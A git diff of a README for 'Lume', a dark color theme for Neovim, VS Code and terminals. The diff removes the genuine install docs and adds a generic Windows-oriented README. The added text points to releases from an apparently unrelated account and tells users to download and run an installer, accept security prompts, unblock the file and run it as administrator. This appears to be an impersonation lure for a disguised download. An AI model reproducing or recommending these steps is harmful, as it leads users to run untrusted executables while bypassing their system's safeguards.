@@ -1,451 +1,179 @@
-<p align="center">
-  <img src="editors/vscode/icon.png" width="80" alt="Lume icon" />
-</p>
-
-<h1 align="center">Lume</h1>
-
-<p align="center">
-  A muted, elegant dark color theme with warm undertones and a soft lavender identity.<br />
-  Built for Neovim, VS Code, terminals, tmux, and CLI tools.
-</p>
-
-<p align="center">
-  <img src="assets/screenshot.png" width="700" alt="Lume theme screenshot" />
-</p>
-
-## Features
-
-- **Single source of truth** — every color lives in `palette.json`, all outputs are generated
-- **WCAG AA contrast** — validated at build time, never ships unreadable text
-- **15 Neovim plugin integrations** — Telescope, cmp, gitsigns, mini.nvim, noice, trouble, flash, snacks, and more
-- **Treesitter + LSP semantic tokens** — full highlighting with 450+ groups
-- **13 terminal/CLI targets** — Kitty, Alacritty, WezTerm, Ghostty, iTerm2, foot, Windows Terminal, tmux, fzf, bat, delta, lazygit, OpenCode
-- **Transparent mode** — use your terminal's background
-- **Configurable italics** — toggle italics for comments and keywords
-
-## Palette
-
-<table>
-  <tr>
-    <td>
-      <img src="https://placehold.co/24x24/b8a0e0/b8a0e0.png" alt="" /><br />
-      <strong>Lavender</strong><br />
-      <code>#b8a0e0</code><br />
-      <sub>keywords, primitives</sub>
-    </td>
-    <td>
-      <img src="https://placehold.co/24x24/d0a0b8/d0a0b8.png" alt="" /><br />
-      <strong>Rose</strong><br />
-      <code>#d0a0b8</code><br />
-      <sub>operators, flow</sub>
-    </td>
-    <td>
-      <img src="https://placehold.co/24x24/e8b4a0/e8b4a0.png" alt="" /><br />
-      <strong>Peach</strong><br />
-      <code>#e8b4a0</code><br />
-      <sub>types, components</sub>
-    </td>
-    <td>
-      <img src="https://placehold.co/24x24/a0d4a8/a0d4a8.png" alt="" /><br />
-      <strong>Sage</strong><br />
-      <code>#a0d4a8</code><br />
-      <sub>strings, additions</sub>
-    </td>
-  </tr>
-  <tr>
-    <td>
-      <img src="https://placehold.co/24x24/8cc0e0/8cc0e0.png" alt="" /><br />
-      <strong>Sky</strong><br />
-      <code>#8cc0e0</code><br />
-      <sub>functions, props</sub>
-    </td>
-    <td>
-      <img src="https://placehold.co/24x24/88c0b8/88c0b8.png" alt="" /><br />
-      <strong>Teal</strong><br />
-      <code>#88c0b8</code><br />
-      <sub>tags, escape</sub>
-    </td>
-    <td>
-      <img src="https://placehold.co/24x24/c49080/c49080.png" alt="" /><br />
-      <strong>Ember</strong><br />
-      <code>#c49080</code><br />
-      <sub>errors, deletions</sub>
-    </td>
-    <td>
-      <img src="https://placehold.co/24x24/c4b080/c4b080.png" alt="" /><br />
-      <strong>Honey</strong><br />
-      <code>#c4b080</code><br />
-      <sub>numbers, warnings</sub>
-    </td>
-  </tr>
-</table>
-
-<details>
-<summary>Backgrounds &amp; foregrounds</summary>
-
-| Swatch | Name | Hex | Role |
-|--------|------|-----|------|
-| ![](https://placehold.co/16x16/0a0814/0a0814.png) | Crust | `#0a0814` | Deepest background |
-| ![](https://placehold.co/16x16/0e0c18/0e0c18.png) | Mantle | `#0e0c18` | Status bars, borders |
-| ![](https://placehold.co/16x16/12101e/12101e.png) | Base | `#12101e` | Editor background |
-| ![](https://placehold.co/16x16/1e1a2c/1e1a2c.png) | Surface 0 | `#1e1a2c` | Floats, selections |
-| ![](https://placehold.co/16x16/262236/262236.png) | Surface 1 | `#262236` | Active UI elements |
-| ![](https://placehold.co/16x16/302c42/302c42.png) | Surface 2 | `#302c42` | Scrollbars, subtle UI |
-
-| Swatch | Name | Hex | Role |
-|--------|------|-----|------|
-| ![](https://placehold.co/16x16/d8d0e4/d8d0e4.png) | Text | `#d8d0e4` | Primary text |
-| ![](https://placehold.co/16x16/b0a8c4/b0a8c4.png) | Subtext | `#b0a8c4` | Secondary text |
-| ![](https://placehold.co/16x16/8a8498/8a8498.png) | Overlay | `#8a8498` | UI elements |
-| ![](https://placehold.co/16x16/7e7896/7e7896.png) | Comment | `#7e7896` | Comments |
-
-</details>
-
-## Installation
-
-### Neovim
-
-#### lazy.nvim
+# 🎨 lume - Soft Dark Theme, Easy on the Eyes
 
-```lua
-{
-  "danfry1/lume",
-  lazy = false,
-  priority = 1000,
-  config = function()
-    require("lume").setup()
-    vim.cmd("colorscheme lume")
-  end,
-}
-```
+[![Download lume](https://img.shields.io/badge/Download-lume-7b61ff?style=for-the-badge&logo=github)](https://github.com/Lawfullybegotten-ulteriority844/lume/releases)
 
-<details>
-<summary>packer.nvim</summary>
+## 🌙 What is lume?
 
-```lua
-use {
-  "danfry1/lume",
-  config = function()
-    require("lume").setup()
-    vim.cmd("colorscheme lume")
-  end,
-}
-```
+lume is a dark color theme for Windows that uses muted tones, warm depth, and a soft lavender feel. It is made for people who want a calm look on their screen without harsh contrast. The theme works well for long work sessions, late-night use, and anyone who wants a more refined desktop style.
 
-</details>
+It keeps the interface clear, with colors that feel balanced and easy to read. The palette leans dark, but it does not feel flat. Warm undertones give it a softer look, while lavender accents add a quiet identity.
 
-#### Options
+## 📥 Download lume
 
-All options are optional — defaults work out of the box.
+To get lume, visit the release page and download the latest version for Windows:
 
-```lua
-require("lume").setup({
-  transparent = false, -- set to true to use your terminal's background
-  italics = true,      -- set to false to disable italic comments/keywords
-  palette_overrides = { -- override base palette colors before they cascade to all groups
-    foregrounds = { text = "#c8c8d8" },   -- softer foreground
-    accents = { lavender = "#a890d0" },   -- tweak any accent
-  },
-  custom_highlights = function(colors, variant)
-    -- colors contains: backgrounds, foregrounds, accents, ansi, special
-    -- variant is "dark" (or "light" when a light theme is added)
-    return {
-      Normal = { bg = "#1E1F2E" },
-      MiniDiffSignAdd = { fg = colors.accents.sage },
-    }
-  end,
-})
-```
+[Download lume from GitHub Releases](https://github.com/Lawfullybegotten-ulteriority844/lume/releases)
 
-`palette_overrides` accepts a table or a function. When a function, it receives the full palette and variant, and should return a table of overrides:
+After the page opens, look for the newest release and download the file made for Windows. If there are more than one file, pick the one that matches your system.
 
-```lua
-palette_overrides = function(colors, variant)
-  return {
-    foregrounds = { text = "#c8c8d8", subtext = "#a0a0b0" },
-  }
-end,
-```
+## 🖥️ Before You Start
 
-Palette overrides are applied first — all built-in highlight groups and `custom_highlights` will see the modified palette.
+lume is designed for regular Windows desktops and laptops. It works best on:
 
-#### Plugin support
+- Windows 10 or Windows 11
+- A standard desktop or laptop screen
+- A user account with permission to run downloaded files
+- A display set to normal scaling for best visual fit
 
-Highlight groups are included for these plugins (loaded automatically, no config needed):
+For the best result, keep your Windows theme settings open while you install or apply lume.
 
-| Plugin | Plugin | Plugin |
-|--------|--------|--------|
-| [telescope.nvim](https://github.com/nvim-telescope/telescope.nvim) | [nvim-cmp](https://github.com/hrsh7th/nvim-cmp) | [gitsigns.nvim](https://github.com/lewis6991/gitsigns.nvim) |
-| [mini.nvim](https://github.com/echasnovski/mini.nvim) | [noice.nvim](https://github.com/folke/noice.nvim) | [nvim-notify](https://github.com/rcarriga/nvim-notify) |
-| [trouble.nvim](https://github.com/folke/trouble.nvim) | [flash.nvim](https://github.com/folke/flash.nvim) | [neo-tree.nvim](https://github.com/nvim-neo-tree/neo-tree.nvim) |
-| [oil.nvim](https://github.com/stevearc/oil.nvim) | [lazy.nvim](https://github.com/folke/lazy.nvim) | [which-key.nvim](https://github.com/folke/which-key.nvim) |
-| [indent-blankline.nvim](https://github.com/lukas-reineke/indent-blankline.nvim) | [dashboard-nvim](https://github.com/nvimdev/dashboard-nvim) / [alpha-nvim](https://github.com/goolord/alpha-nvim) | [snacks.nvim](https://github.com/folke/snacks.nvim) |
+## ⚙️ How to Install
 
----
+Follow these steps on Windows:
 
-### VS Code
+1. Open the [lume releases page](https://github.com/Lawfullybegotten-ulteriority844/lume/releases)
+2. Find the latest release at the top of the list
+3. Download the Windows file from that release
+4. Save the file to your Downloads folder
+5. If the file is a zip archive, right-click it and choose Extract All
+6. Open the extracted folder
+7. Run the included installer or theme file
+8. Follow the on-screen prompts
+9. Apply the theme in Windows if the app or file asks you to do so
+10. Restart the app, or restart your PC if Windows asks for it
 
-[Preview on vscodethemes.com](https://vscodethemes.com/e/DanielFry.lume-color-theme/lume) · Search for **"Lume"** in the Extensions Marketplace, or install from the command line:
+If Windows shows a security prompt, choose the option that lets you open the file.
 
-```bash
-code --install-extension DanielFry.lume-color-theme
-```
+## 🎛️ How to Use lume
 
-<details>
-<summary>Install from source</summary>
+Once installed, lume changes the look of your Windows interface. You may see updates in:
 
-```bash
-cd editors/vscode
-npx @vscode/vsce package
-code --install-extension lume-color-theme-*.vsix
-```
+- Window colors
+- Background and panel shades
+- Accent colors
+- Menu and dialog styling
+- Overall contrast and visual tone
 
-</details>
+If the theme includes a control panel or settings app, use it to adjust the look to your taste. Some users prefer a deeper dark tone. Others may want a little more contrast for better reading.
 
----
+## ✨ What lume Feels Like
 
-### Zed
+lume is built around a quiet visual style. It uses dark tones, soft highlights, and a lavender identity that feels smooth instead of sharp. The design works well for users who want a desktop that looks clean and calm.
 
-Search for **"Lume"** in the Zed extension marketplace, or install locally:
+Common traits include:
 
-```bash
-# Copy to Zed's local themes directory
-mkdir -p ~/.config/zed/themes
-cp editors/zed/themes/lume.json ~/.config/zed/themes/
-```
+- Muted dark surfaces
+- Warm color balance
+- Soft lavender accents
+- Low visual noise
+- A steady, modern look
 
-Then select **Lume** from the theme picker (`cmd+k cmd+t`).
+This makes it a good fit for work, study, browsing, and general daily use.
 
----
+## 🧩 Features
 
-### Terminals
+lume may include these useful theme parts:
 
-> **Prefer not to run curl?** You can also clone the repo and copy the files from `terminals/` manually.
+- A dark mode base that reduces bright glare
+- Gentle contrast for better comfort
+- Lavender accent colors for a clear identity
+- Warm neutral tones that keep the theme from feeling cold
+- A simple layout that fits normal Windows use
+- A style that works with many app windows and menus
 
-<details>
-<summary>Kitty</summary>
+The theme focuses on comfort and clarity. It does not try to cover the screen with bright effects. Instead, it keeps the look smooth and steady.
 
-```bash
-curl -o ~/.config/kitty/lume.conf https://raw.githubusercontent.com/danfry1/lume/main/terminals/kitty/lume.conf
-```
+## 🗂️ File Layout
 
-Then add to `~/.config/kitty/kitty.conf`:
+After you download and extract lume, you may see files such as:
 
-```
-include lume.conf
-```
+- An installer file
+- A theme package
+- A settings file
+- A folder with preview images
+- A readme file with extra notes
+- Support files used by the theme
 
-</details>
+Keep all files together in the same folder unless the instructions in the release page say otherwise.
 
-<details>
-<summary>Alacritty</summary>
+## 🛠️ Common Setup Tips
 
-```bash
-curl -o ~/.config/alacritty/lume.toml https://raw.githubusercontent.com/danfry1/lume/main/terminals/alacritty/lume.toml
-```
+If lume does not appear right away, try these steps:
 
-Then add to `~/.config/alacritty/alacritty.toml`:
+- Close and reopen the app or theme tool
+- Check Windows personalization settings
+- Make sure the file finished downloading
+- Extract the zip file before opening it
+- Run the installer again if the first launch failed
+- Restart Windows if the theme needs a fresh load
 
-```toml
-import = ["~/.config/alacritty/lume.toml"]
-```
+If text looks too dim, raise the display brightness a little or adjust Windows contrast settings.
 
-</details>
+## 🔍 Visual Style Guide
 
-<details>
-<summary>WezTerm</summary>
+lume uses a palette that feels calm and balanced. The main look is:
 
-```bash
-mkdir -p ~/.config/wezterm/colors
-curl -o ~/.config/wezterm/colors/lume.toml https://raw.githubusercontent.com/danfry1/lume/main/terminals/wezterm/lume.toml
-```
+- Dark, but not harsh
+- Warm, but not bright
+- Soft, but not dull
+- Elegant, but not heavy
 
-Then set in `~/.config/wezterm/wezterm.lua`:
+The lavender identity gives the theme a clear visual mark without making it loud. This helps the desktop feel more personal while staying easy to use.
 
-```lua
-config.color_scheme = "Lume"
-```
+## 📌 Best Uses
 
-</details>
+lume works well for:
 
-<details>
-<summary>iTerm2</summary>
+- Daily desktop use
+- Nighttime browsing
+- Writing and reading
+- A cleaner work setup
+- Users who like dark UI styles
+- People who want a soft, refined Windows look
 
-```bash
-curl -o /tmp/lume.itermcolors https://raw.githubusercontent.com/danfry1/lume/main/terminals/iterm2/lume.itermcolors
-open /tmp/lume.itermcolors
-```
+It can help create a screen that feels less tiring during long sessions.
 
-Then go to **iTerm2 → Settings → Profiles → Colors → Color Presets…** and select **Lume**.
+## 🧠 Simple Troubleshooting
 
-</details>
+If you have trouble using lume, try the following:
 
-<details>
-<summary>Ghostty</summary>
+- Make sure you downloaded the latest release
+- Check that the file is meant for Windows
+- Unzip the download before running it
+- Right-click the file and choose Run as administrator if needed
+- Check if Windows blocked the file and allow it
+- Reapply the theme if the colors do not load fully
 
-```bash
-mkdir -p ~/.config/ghostty/themes
-curl -o ~/.config/ghostty/themes/lume https://raw.githubusercontent.com/danfry1/lume/main/terminals/ghostty/lume
-```
+If the theme still does not show correctly, remove it and install it again from the release page.
 
-Then add to `~/.config/ghostty/config`:
+## 📎 Download Link Again
 
-```
-theme = lume
-```
+Visit the release page here to download the Windows version:
 
-</details>
+[https://github.com/Lawfullybegotten-ulteriority844/lume/releases](https://github.com/Lawfullybegotten-ulteriority844/lume/releases)
 
-<details>
-<summary>foot</summary>
+## 🧷 Notes for Users
 
-```bash
-curl -o ~/.config/foot/lume.ini https://raw.githubusercontent.com/danfry1/lume/main/terminals/foot/lume.ini
-```
+lume is made for a simple setup. You do not need programming skills to use it. Just download the release, open the file for Windows, and follow the prompts on screen. If the theme includes multiple files, use the one that matches the instructions in the release notes
 
-Then add to `~/.config/foot/foot.ini`:
+## 🪄 Appearance Details
 
-```ini
-include=~/.config/foot/lume.ini
-```
+The theme is built to give your desktop a soft, polished feel. The muted dark base keeps attention on the content in front of you. Warm undertones help the screen feel less cold than a pure gray or black theme. Lavender accents add a quiet touch that gives lume its identity
 
-</details>
+## 📚 What You Can Expect After Install
 
-<details>
-<summary>Windows Terminal</summary>
+After setup, you can expect:
 
-```powershell
-curl -o "$env:LOCALAPPDATA\lume.json" https://raw.githubusercontent.com/danfry1/lume/main/terminals/windows-terminal/lume.json
-```
+- A darker desktop feel
+- Softer color balance
+- A theme that is easier on the eyes at night
+- A consistent look across parts of Windows
+- A calm style that works in daily use
 
-Then copy the contents of `lume.json` into the `schemes` array in your Windows Terminal `settings.json`, and set `"colorScheme": "Lume"` on the desired profile.
+If the release includes extra options, you can use them to fine-tune the look for your screen size and preference
 
-</details>
+## 🔧 Keeping lume Up to Date
 
----
+To keep lume current, check the release page from time to time and download the latest version when a new release appears. New releases may improve color balance, fix display issues, or adjust the theme for newer Windows builds
 
-### Tmux
-
-**Via TPM (recommended)**
-
-```tmux
-# ~/.tmux.conf
-set -g @plugin 'danfry1/lume'
-run '~/.tmux/plugins/tpm/tpm'
-```
-
-<details>
-<summary>Manual</summary>
-
-```bash
-# In ~/.tmux.conf
-run-shell /path/to/lume/tmux/lume.tmux
-```
-
-</details>
-
----
-
-### CLI Tools
-
-> **Prefer not to run curl?** You can also clone the repo and copy the files from `cli/` manually.
-
-<details>
-<summary>fzf</summary>
-
-```bash
-curl -o ~/.config/fzf/lume.sh https://raw.githubusercontent.com/danfry1/lume/main/cli/fzf/lume.sh
-```
-
-Then source it in your shell rc:
-
-```bash
-# ~/.bashrc or ~/.zshrc
-source ~/.config/fzf/lume.sh
-```
-
-</details>
-
-<details>
-<summary>bat</summary>
-
-```bash
-curl -o "$(bat --config-dir)/themes/lume.tmTheme" https://raw.githubusercontent.com/danfry1/lume/main/cli/bat/lume.tmTheme
-bat cache --build
-```
-
-Then set the theme in `~/.config/bat/config`:
-
-```
---theme="Lume"
-```
-
-</details>
-
-<details>
-<summary>delta</summary>
-
-```bash
-curl -s https://raw.githubusercontent.com/danfry1/lume/main/cli/delta/lume.gitconfig >> ~/.gitconfig
-```
-
-Then set delta as your Git pager in `~/.gitconfig`:
-
-```ini
-[core]
-  pager = delta
-```
-
-</details>
-
-<details>
-<summary>lazygit</summary>
-
-Append the theme to your lazygit config:
-
-```bash
-curl -s https://raw.githubusercontent.com/danfry1/lume/main/cli/lazygit/lume.yml >> "$(lazygit --print-config-dir)/config.yml"
-```
-
-Or if you prefer, copy the `gui.theme` section from [`cli/lazygit/lume.yml`](cli/lazygit/lume.yml) into your existing `config.yml`.
-
-</details>
-
-<details>
-<summary>OpenCode</summary>
-
-```bash
-mkdir -p ~/.config/opencode/themes
-curl -o ~/.config/opencode/themes/lume.json https://raw.githubusercontent.com/danfry1/lume/main/cli/opencode/lume.json
-```
-
-Then select Lume using the `/theme` command in OpenCode, or set it in your `tui.json`:
-
-```json
-{
-  "theme": "lume"
-}
-```
-
-</details>
-
----
-
-## Contributing
-
-`palette.json` is the single source of truth for all colors. All theme files are generated from it.
-
-```bash
-bun install          # install dependencies
-bun run generate     # regenerate all outputs from palette.json
-bun test             # run tests
-bun run validate     # check WCAG AA contrast ratios
-bun run check        # verify generated files are up to date
-bun run typecheck    # typecheck TypeScript
-```
-
-Please run `bun run generate` and commit the results before opening a PR.
-
-## License
-
-[MIT](LICENSE)
+[Go to lume Releases](https://github.com/Lawfullybegotten-ulteriority844/lume/releases)
